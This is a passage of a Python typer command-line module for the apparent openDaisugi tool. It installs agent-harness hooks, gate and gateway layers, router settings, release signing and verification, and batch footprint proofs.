            typer.echo(f"  {summary.preview_skipped} too large to preview")
        if summary.errored:
            typer.echo(f"  {summary.errored} errored")

    if summary.errored > 0:
        raise typer.Exit(code=1)


@app.command("install", rich_help_panel="Gate")
def install_cmd(
    dry_run: bool = typer.Option(
        False, "--dry-run", help="Show what would change without writing anything."
    ),
    yes: bool = typer.Option(False, "--yes", "-y", help="Skip confirmation prompt."),
    print_skill: bool = typer.Option(
        False, "--print-skill", help="Print the opendaisugi-checklist skill content to stdout."
    ),
    do_uninstall: bool = typer.Option(False, "--uninstall", help="Reverse all managed changes."),
    runtime: list[str] = typer.Option(
        None, "--runtime", help="Target named runtime(s) only, e.g. --runtime claude."
    ),
    harness: list[str] = typer.Option(
        None,
        "--harness",
        help="Install a loop harness's gate extension. Supported: pi, opencode. "
        "Independent of --runtime.",
    ),
    gate: bool = typer.Option(
        False,
        "--gate/--no-gate",
        help="Also install the ADR-0007 fail-closed verify hook (opt-in; shadow by default).",
    ),
    enforce: bool = typer.Option(
        False,
        "--enforce/--shadow",
        help="Gate mode: --enforce denies out-of-envelope calls; --shadow (default) only "
        "observes. Only meaningful together with --gate.",
    ),
    ask: bool = typer.Option(
        False,
        "--ask/--no-ask",
        help="Hand an enforce-mode would-deny to a present operator for a bounded time "
        "before letting the deny stand (Claude Code only). Off by default; only "
        "meaningful together with --gate --enforce.",
    ),
    gateway: bool = typer.Option(
        False,
        "--gateway/--no-gateway",
        help="Also point the harness at the local token-saving gateway (opt-in).",
    ),
    allow_shell_decomposition: bool | None = _DECOMPOSE_OPT,
    base_url: str = typer.Option(
        "http://127.0.0.1:8787",
        "--base-url",
        help="Gateway base_url to wire in when --gateway is set.",
    ),
    report: str = typer.Option(
        None,
        "--report",
        help="Report gate state (idle/working/blocked/done) to a floor host. "
        "herdr wires Stop + Notification hooks (Claude Code only). coppice "
        "records the preference in config.yaml. Nothing reports to it yet. "
        "Only meaningful together with --gate.",
    ),
    router: str = typer.Option(
        None,
        "--router",
        help="Who picks the model for each gateway turn: rules, switchyard, or off. "
        "Saved as gateway_router in config.yaml. Leave it out to keep the current choice. "
        "Only meaningful together with --gateway.",
    ),
    efficient_model: str = typer.Option(
        None,
        "--efficient-model",
        help="The model id of Switchyard's efficient tier: a local model id, or a claude-* "
        "id on the Anthropic API. Needed with --router switchyard.",
    ),
    capable_model: str = typer.Option(
        None,
        "--capable-model",
        help="The model id of Switchyard's capable tier. Default: the value in config.yaml, "
        "claude-sonnet-5 at first.",
    ),
    api_key_env: str = typer.Option(
        None,
        "--api-key-env",
        help="Name an environment variable that holds an Anthropic API key. Every "
        "Switchyard cloud tier then uses that key, billed per token. Without it, every "
        "cloud tier forwards your own login. An empty value clears the name.",
    ),
) -> None:
    """Wire openDaisugi into every detected agent harness.

    Detects Claude Code, Codex, Hermes, and OpenClaw and installs four layers
    by default: the opendaisugi-checklist skill (discovered on demand — no
    per-session cost), the MCP tool server, a passive capture hook that feeds
    distillation, and pathway-routing instructions. All changes are
    idempotent, backed up, and reversible with --uninstall.

    Two more layers are opt-in (ADR-0013, "one install that both saves and
    verifies"): --gate installs the fail-closed ADR-0007 verify hook
    (Claude Code, shadow unless --enforce), and --gateway points the harness
    at the local token-saving gateway (Claude Code and OpenClaw only — Codex
    and Hermes speak an OpenAI wire the gateway doesn't emit, so they are
    reported as an honest gap rather than silently skipped).
    """
    if print_skill:
        from opendaisugi.install import print_skill as _print_skill

        typer.echo(_print_skill())
        return

    from opendaisugi.install import (
        DEFAULT_LAYERS,
        Layer,
        _select_runtimes,
        detect_runtimes,
    )
    from opendaisugi.install import (
        install as _install,
    )
    from opendaisugi.install import (
        uninstall as _uninstall,
    )

    home = Path.home()

    if harness:
        from opendaisugi.install import (
            SUPPORTED_HARNESSES,
            harness_extension_target,
            install_harness_extension,
            uninstall_harness_extension,
        )

        bad = [h for h in harness if h not in SUPPORTED_HARNESSES]
        if bad:
            typer.echo(
                f"error: unknown harness {bad[0]!r}. Supported: {', '.join(SUPPORTED_HARNESSES)}.",
                err=True,
            )
            raise typer.Exit(code=2)
        restart = {
            "pi": "Restart pi, or run /reload in an interactive session, for it to take effect.",
            "opencode": "Restart OpenCode for it to take effect.",
        }
        label = {"pi": "pi", "opencode": "OpenCode"}
        if do_uninstall:
            for h in harness:
                target = harness_extension_target(h, home=home)
                if h == "pi":
                    target = target.parent
                if dry_run:
                    typer.echo(f"[{h}] would remove {target}")
                    continue
                removed = uninstall_harness_extension(h, home=home)
                if removed:
                    typer.echo(f"[{h}] removed {len(removed)} file(s).")
                else:
                    typer.echo(f"[{h}] nothing was installed.")
            return
        if dry_run:
            for h in harness:
                typer.echo(f"[{h}] would write {harness_extension_target(h, home=home)}")
            return
        for h in harness:
            try:
                install_harness_extension(h, home=home)
            except ValueError as exc:
                typer.echo(f"[{h}] error: {exc}", err=True)
                raise typer.Exit(code=1)
            typer.echo(f"[{h}] gate extension installed. {restart[h]}")
        for h in harness:
            typer.echo(
                f"{label[h]} asks the gate in-process. The gate only watches until you set "
                "gate_mode: enforce. Start it with `daisugi start`."
            )
        return
    try:
        runtimes = _select_runtimes(runtime) if runtime else detect_runtimes(home=home)
    except ValueError as exc:
        typer.echo(f"Error: {exc}", err=True)
        raise typer.Exit(code=2)

    if not runtimes:
        typer.echo("No supported agent runtimes detected (Claude Code, Codex, Hermes, OpenClaw).")
        typer.echo("Install one and re-run, or see docs/hook-integration.md for manual setup.")
        raise typer.Exit(code=0)

    if do_uninstall:
        result = _uninstall(home=home, runtimes=runtimes)
        typer.echo(result.summary)
        if result.modified_files:
            typer.echo("\nReverted:")
            for f in result.modified_files:
                typer.echo(f"  {f}")
        if result.failures:
            raise typer.Exit(code=1)
        return

    # With no envelope registered, an enforce hook denies every call, so the
    # agent can do nothing at all. Refuse before anything is written.
    if gate and enforce:
        from opendaisugi.gate import _envelopes_dir

        env_dir = _envelopes_dir(home / ".opendaisugi" / "gate")
        if not (env_dir.exists() and any(env_dir.glob("*.json"))):
            typer.echo(ENFORCE_NEEDS_POLICY, err=True)
            raise typer.Exit(code=1)

    selected_layers = set(DEFAULT_LAYERS)
    if gate:
        selected_layers.add(Layer.GATE)
    if gateway:
        selected_layers.add(Layer.BASE_URL)

    if enforce and not gate:
        typer.echo("Note: --enforce only applies with --gate; no gate hook will be installed.")
    if ask and not (gate and enforce):
        typer.echo("Note: --ask only applies with --gate --enforce; no operator ask will be wired.")
    # The message above is the contract: --ask without --gate --enforce is a
    # no-op. effective_ask is what actually reaches every call site below —
    # a plain `ask` here would bake --ask (and the widened ~105s hook
    # timeout) into a SHADOW-mode install while telling the operator it
    # wasn't wired.
    effective_ask = ask and gate and enforce

    if report is not None and report not in ("herdr", "coppice"):
        # Global Constraints §Exit codes: 1 = user error, not 2 (gate deny)
        # — a bad --report value never touched the gate. STE100 (whole-branch
        # review, minor 10): teach the next command instead of echoing the
        # bad value back.
        typer.echo(
            "Error: --report must be herdr or coppice. Run: daisugi install --gate --report herdr",
            err=True,
        )
        raise typer.Exit(code=1)
    if report and not gate:
        typer.echo("Note: --report needs --gate. This run installs no floor-report hooks.")
    effective_report = report if gate else None

    # Check the router choice before anything is written, so a bad value
    # leaves the harness and config.yaml as they were.
    router_update = _plan_router_update(
        home,
        router,
        gateway=gateway,
        efficient_model=efficient_model,
        capable_model=capable_model,
        api_key_env=api_key_env,
    )

    typer.echo("\nDetected runtimes:")
    for rt in runtimes:
        typer.echo(f"  ✓ {rt.name}")

    plans = {
        rt.name: rt.plan(
            home,
            selected_layers,
            enforce=enforce,
            ask=effective_ask,
            base_url=base_url,
            report=effective_report,
        )
        for rt in runtimes
    }

    typer.echo("\nopenDaisugi will make these changes:\n")
    for rt in runtimes:
        typer.echo(f"[{rt.name}]")
        for step in plans[rt.name]:
            target_hint = f"  → {step.target}" if step.target else ""
            marker = "+" if step.supported else "!"
            typer.echo(f"  {marker} [{step.layer.value}] {step.description}{target_hint}")
        typer.echo("")

    gap_lines = [
        f"  [{rt.name}] {step.layer.value}: {step.description}"
        for rt in runtimes
        for step in plans[rt.name]
        if not step.supported
    ]
    if gap_lines:
        typer.echo("Honest gaps (selected but not wired for this harness):")
        for line in gap_lines:
            typer.echo(line)
        typer.echo("")

    typer.echo("Skill is discovered on demand — zero added tokens for simple sessions.")
    typer.echo("Tool calls are captured to ~/.opendaisugi/captures/ for distillation.\n")

    if Layer.GATE in selected_layers:
        # The gate hook is wired here; the policy it checks against is not. With
        # no envelope registered, enforce mode denies every call.
        typer.echo(
            "The gate checks each call against a registered envelope — this install "
            "writes the hook, not the policy. Run `daisugi gate init` to register one "
            "(add --allow-shell-decomposition to admit `a && b` and pipes).\n"
        )

    if router_update is not None:
        typer.echo(f"Router: set gateway_router to {router_update['gateway_router']}.")

    if dry_run:
        typer.echo("Dry run — no files written.")
        return

    if not yes:
        confirmed = typer.confirm("Proceed?", default=False)
        if not confirmed:
            typer.echo("Aborted.")
            raise typer.Exit(code=0)

    result = _install(
        home=home,
        yes=True,
        runtimes=runtimes,
        layers=selected_layers,
        enforce=enforce,
        ask=effective_ask,
        base_url=base_url,
        report=effective_report,
    )

    if result.modified_files:
        typer.echo("\nDone. Files modified:")
        for f in result.modified_files:
            typer.echo(f"  {f}")
        typer.echo("\nRestart your agent session to pick up the changes.")
    elif not result.failures:
        typer.echo("\nAll runtimes were already configured — nothing changed.")
    # A runtime whose apply raised wrote nothing. Say which, and exit 1 at
    # the end: never report it as already configured.
    for failure in result.failures:
        typer.echo(f"Failed: {failure}. Nothing was written for it.", err=True)

    # Persist the compound-shell default. This is the only channel that reaches
    # `hook auto-tend`, which runs from cron and from a detached spawn — no argv
    # to carry a flag, stdout and stderr on DEVNULL.
    if allow_shell_decomposition is not None:
        from opendaisugi.config import load_config, save_config

        cfg_path = home / ".opendaisugi" / "config.yaml"
        save_config(
            load_config(cfg_path).model_copy(
                update={"shell_allow_decomposition": allow_shell_decomposition}
            ),
            cfg_path,
        )
        state = "on" if allow_shell_decomposition else "off"
        typer.echo(
            f"Compound-shell decomposition default: {state} ({cfg_path}) — config is "
            "your data, so it survives --uninstall; edit or delete the file to reset it."
        )
        _warn_if_decomposition_unusable(allow_shell_decomposition)

    if router_update is not None:
        _apply_router_update(home, router_update)

    if effective_report is not None:
        # Every --report value is persisted, herdr included (Fix round 1,
        # Finding 2) — otherwise the field can go stale relative to what's
        # actually installed (e.g. a later --report herdr leaving a prior
        # run's "coppice" sitting in config.yaml).
        from opendaisugi.config import load_config, save_config

        cfg_path = home / ".opendaisugi" / "config.yaml"
        save_config(
            load_config(cfg_path).model_copy(update={"floor_report": effective_report}), cfg_path
        )
        if effective_report == "coppice":
            typer.echo(
                f"Floor report set to coppice. Saved in {cfg_path}. "
                "The coppice server is built. Nothing reports to it yet."
            )

    # Ask once whether to distil repeated tasks in the background (Phase A).
    # Interactive only; a --yes install leaves consent unasked (opt-in, never
    # assumed). Distillation affects only cost — the guard enforces safety.
    if not yes:
        from opendaisugi.config import ensure_auto_tend_consent, load_config

        cfg_path = home / ".opendaisugi" / "config.yaml"
        if load_config(cfg_path).auto_tend is None:
            after = ensure_auto_tend_consent(
                load_config(cfg_path),
                lambda: typer.confirm(
                    "\nLet openDaisugi distil your repeated tasks in the background, "
                    "so reuse compounds automatically? (only affects cost — the "
                    "guard enforces safety either way)",
                    default=True,
                ),
                path=cfg_path,
            )
            if after.auto_tend:
                typer.echo(
                    "Background distillation is ON — no cron needed: your capture "
                    "hook kicks off a rate-limited tend on its own. (You can also "
                    "run `daisugi hook auto-tend` any time.)"
                )
            else:
                typer.echo("Left OFF — run `daisugi tend` yourself whenever you want it.")

    if result.failures:
        raise typer.Exit(code=1)


def _plan_router_update(
    home: Path,
    router: str | None,
    *,
    gateway: bool,
    efficient_model: str | None,
    capable_model: str | None,
    api_key_env: str | None = None,
) -> dict | None:
    """The config.yaml fields a --router choice sets, checked, or None for no change.

    Every refusal exits with code 1 before anything is written.
    """
    if router is None:
        if efficient_model or capable_model or api_key_env is not None:
            typer.echo(
                "Note: --efficient-model, --capable-model and --api-key-env apply with "
                "--router switchyard."
            )
        return None
    if router not in _ROUTERS:
        _fail(
            f"unknown --router {router!r}.",
            "the gateway knows three choosers.",
            f"choose one of: {', '.join(_ROUTERS)}",
            code=1,
        )
    if not gateway:
        typer.echo("Note: --router only applies with --gateway. This run writes no router config.")
        return None
    update: dict = {"gateway_router": router}
    if router != "switchyard":
        return update
    from opendaisugi.config import load_config
    from opendaisugi.router_switchyard import render_switchyard_toml, targets_from_config

    cfg = load_config(home / ".opendaisugi" / "config.yaml")
    efficient = efficient_model or cfg.switchyard_efficient_model
    if not efficient:
        _fail(
            "--router switchyard needs an efficient model.",
            "the stage router chooses between a capable tier and a cheaper one.",
            "add --efficient-model <id>: a local model id, or a claude-* id.",
            code=1,
        )
    update["switchyard_efficient_model"] = efficient
    update["switchyard_capable_model"] = capable_model or cfg.switchyard_capable_model
    if api_key_env is not None:
        update["switchyard_api_key_env"] = api_key_env.strip() or None
    candidate = cfg.model_copy(update=update)
    try:
        # The key variable is checked when the gateway starts, in its own
        # environment, not in the shell that runs install.
        render_switchyard_toml(
            targets_from_config(candidate),
            route_id=cfg.switchyard_route_id,
            api_key_present=lambda name: True,
        )
    except ValueError as exc:
        _fail(
            f"cannot build the Switchyard route: {exc}",
            "the two tiers must name two different models.",
            "run again with a different --efficient-model or --capable-model.",
            code=1,
        )
    return update


def _apply_router_update(home: Path, update: dict) -> None:
    """Save the router fields, and for switchyard write the TOML file next to them."""
    from opendaisugi.config import load_config, save_config

    cfg_path = home / ".opendaisugi" / "config.yaml"
    cfg = load_config(cfg_path).model_copy(update=update)
    save_config(cfg, cfg_path)
    if cfg.gateway_router != "switchyard":
        typer.echo(
            f"Gateway router set to {cfg.gateway_router} in {cfg_path}. "
            "Restart `daisugi gateway` to use it."
        )
        return
    from opendaisugi.router_switchyard import (
        INSTALL_CMD,
        client_auth_modes,
        locate_binary,
        render_switchyard_toml,
        targets_from_config,
        write_switchyard_config,
    )

    targets = targets_from_config(cfg)
    toml_path = write_switchyard_config(
        home / ".opendaisugi",
        render_switchyard_toml(
            targets, route_id=cfg.switchyard_route_id, api_key_present=lambda name: True
        ),
    )
    auth = client_auth_modes(targets)
    typer.echo(f"Switchyard router: wrote {toml_path} and set gateway_router in {cfg_path}.")
    typer.echo(f"  capable tier {targets.capable_id}: {auth['capable']}")
    typer.echo(f"  efficient tier {targets.efficient_id}: {auth['efficient']}")
    if targets.api_key_env and not os.environ.get(targets.api_key_env):
        typer.echo(
            f"  {targets.api_key_env} is not set in this shell. The gateway refuses to start "
            "until it is set in the shell that starts it."
        )
    if locate_binary() is None:
        typer.echo(f"  switchyard-server is not on PATH yet. Install it with: {INSTALL_CMD}")
    typer.echo("  Start it with: daisugi gateway --router switchyard")


@release_app.command("keygen")
def release_keygen_cmd(
    out_dir: Path = typer.Option(
        Path.cwd(), "--out-dir", help="Directory to write the keypair into."
    ),
    name: str = typer.Option("release_signing", "--name", help="Key file basename."),
) -> None:
    """Generate an ed25519 release-signing keypair.

    Writes ``<name>.key`` (private, chmod 600) and ``<name>.pub`` (public). Keep
    the private half OFFLINE — this command never uploads or registers anything.
    Publish the ``.pub`` and have downloaders add it to their trusted-signer
    registry (``daisugi`` uses ``~/.opendaisugi/trusted_signers.json``).
    """
    from opendaisugi.signing import generate_keypair

    out_dir.mkdir(parents=True, exist_ok=True)
    priv_b64, pub_b64 = generate_keypair()
    priv_path = out_dir / f"{name}.key"
    pub_path = out_dir / f"{name}.pub"
    priv_path.write_text(priv_b64 + "\n", encoding="utf-8")
    priv_path.chmod(0o600)
    pub_path.write_text(pub_b64 + "\n", encoding="utf-8")
    typer.echo(f"private key → {priv_path} (chmod 600 — keep it offline)")
    typer.echo(f"public key  → {pub_path}")
    typer.echo(f"public key (b64): {pub_b64}")


@release_app.command("sign")
def release_sign_cmd(
    artifacts: list[Path] = typer.Argument(..., help="Release artifact files to sign."),
    version: str = typer.Option(..., "--version", help="Release version string."),
    key: Path = typer.Option(..., "--key", help="Path to the base64 ed25519 private key."),
    signer: str = typer.Option(..., "--signer", help="Signer name to bind into the manifest."),
    out: Path = typer.Option(Path("release-manifest.json"), "--out", "-o"),
) -> None:
    """Build a SHA-256 manifest over ARTIFACTS and sign it."""
    from datetime import datetime, timezone

    from opendaisugi.release import build_manifest, dump_manifest, sign_manifest

    missing = [str(a) for a in artifacts if not a.exists()]
    if missing:
        typer.echo(f"no such artifact(s): {', '.join(missing)}", err=True)
        raise typer.Exit(code=2)
    created_at = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
    manifest = build_manifest(list(artifacts), version=version, created_at=created_at)
    priv = key.read_text(encoding="utf-8").strip()
    signed = sign_manifest(manifest, priv, signer=signer)
    dump_manifest(signed, out)
    typer.echo(f"signed manifest ({len(signed['artifacts'])} artifacts) → {out}")


@release_app.command("verify")
def release_verify_cmd(
    manifest_path: Path = typer.Argument(..., help="Path to the signed release manifest."),
    artifact_dir: Path = typer.Option(
        Path.cwd(), "--artifact-dir", help="Directory holding the artifacts to check."
    ),
    signer: list[str] = typer.Option(
        None,
        "--signer",
        help="Trusted signer name(s) to accept. Repeatable. "
        "Default: every signer in the local registry.",
    ),
    registry_path: Path = typer.Option(
        None,
        "--registry",
        help="Trusted-signer registry JSON (default: ~/.opendaisugi/trusted_signers.json).",
    ),
) -> None:
    """Verify a release: trusted signature AND intact artifacts. Fails closed."""
    from opendaisugi.release import load_manifest, verify_release
    from opendaisugi.signing import TrustedSignerRegistry, default_registry_path

    reg = TrustedSignerRegistry.load(registry_path or default_registry_path())
    signer_names = signer or reg.names()
    if not signer_names:
        typer.echo(
            f"no trusted signers: add the release pubkey to {reg.path} or pass --signer",
            err=True,
        )
        raise typer.Exit(code=1)

    manifest = load_manifest(manifest_path)
    result = verify_release(
        manifest,
        artifact_dir=artifact_dir,
        registry=reg,
        signer_names=signer_names,
    )
    if result.ok:
        typer.echo(f"OK — {result.reason} (signer: {result.signer})")
        raise typer.Exit(code=0)
    typer.echo(f"FAILED — {result.reason}", err=True)
    raise typer.Exit(code=1)


@batch_app.command("prove")
def batch_prove_cmd(
    declaration: Path = typer.Argument(..., help="Path to a BatchDeclaration JSON."),
    envelope: Path = typer.Option(
        ..., "--envelope", "-e", help="Envelope JSON to prove the footprint against."
    ),
) -> None:
    """Statically prove a declared batch before any iteration.

    Resolves every item to its concrete write-set, proves each write is inside both
    the envelope and the declared footprint F using the same concrete matcher the
    runtime gate uses, and probes reversibility. Exits non-zero (fail-closed) if the
    program is non-batchable, any write is unprovable or under-declared, or any target
    would be irreversible.
    """
    from opendaisugi.batch import (
        BatchDeclaration,
        classify_declaration,
        prove_footprint,
        would_be_reversible,
    )
    from opendaisugi.models import Envelope

    decl = BatchDeclaration.model_validate_json(declaration.read_text())
    env = Envelope.model_validate_json(envelope.read_text())

    cls = classify_declaration(decl)
    if not cls.batchable:
        kinds = ", ".join(sorted({nb["type"] for nb in cls.non_batchable}))
        typer.echo(
            f"NOT BATCHABLE — program contains non-batchable step kind(s): {kinds}", err=True
        )
        raise typer.Exit(code=1)

    proof = prove_footprint(decl, env)
    for w in proof.resolved_writes:
        typer.echo(f"  write: {w}")
    irreversible = [w for w in proof.resolved_writes if not would_be_reversible(w)]

    if proof.ok and not irreversible:
        typer.echo(
            f"PROVABLE — {len(proof.resolved_writes)} write(s), all inside the "
            "envelope and the declared footprint F; one proof covers all N."
        )
        raise typer.Exit(code=0)
    if not proof.ok:
        typer.echo(f"UNPROVABLE — {proof.reason}", err=True)
    if irreversible:
        typer.echo(f"IRREVERSIBLE TARGETS (cannot enter a batch): {irreversible}", err=True)
    raise typer.Exit(code=1)


if __name__ == "__main__":  # enable `python -m opendaisugi.cli ...`
    main()
